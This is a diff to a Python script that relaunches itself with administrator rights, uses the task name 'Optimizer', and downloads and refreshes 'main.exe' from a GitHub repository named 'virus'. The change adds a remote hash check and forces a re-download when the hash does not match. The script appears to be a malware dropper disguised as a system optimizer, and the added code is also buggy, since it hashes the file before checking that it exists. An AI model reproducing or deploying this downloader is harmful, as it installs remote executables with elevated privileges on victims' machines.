@@ -2,12 +2,13 @@ import os
 import sys
 import ctypes
 import subprocess
+import hashlib
 import requests
 from tqdm import tqdm
 
 TASK_NAME = "Optimizer"
 APP_NAME = "main.exe"
-DOWNLOAD_URL = "https://github.com/aslskks/virus/raw/refs/heads/main/main.exe"
+DOWNLOAD_URL = "https://github.com/aslskks/virus/raw/refs/heads/main/"
 
 
 # -----------------------
@@ -96,6 +97,14 @@ def download_exe(url, app_name):
     except requests.RequestException as e:
         print(f"Error descargando archivo: {e}")
         return False
+def hash_file(path, algorithm="sha256", chunk_size=1024 * 1024):  # 1 MB chunks
+    hasher = hashlib.new(algorithm)
+    
+    with open(path, "rb") as f:
+        while chunk := f.read(chunk_size):
+            hasher.update(chunk)
+    
+    return hasher.hexdigest()
 def main():
     if not is_admin():
         relaunch_as_admin()
@@ -104,9 +113,15 @@ def main():
     if res == "no":
         sys.exit()
     exe_path = os.path.abspath(APP_NAME)
-
-    if not os.path.exists(exe_path):
-        ok = download_with_progress(DOWNLOAD_URL, APP_NAME)
+    hasha = hash_file("main.exe")
+    if os.path.exists("hash.txt"):
+        os.remove("hash.txt")
+    download_with_progress(DOWNLOAD_URL + "hash.txt", "hash.txt")
+    with open("hash.txt") as file:
+        hash_txt = file.read()
+    hash_proved = True if hasha == hash_txt else False
+    if not os.path.exists(exe_path) or not hash_proved:
+        ok = download_with_progress(DOWNLOAD_URL + "main.exe", APP_NAME)
         if not ok:
             return
 
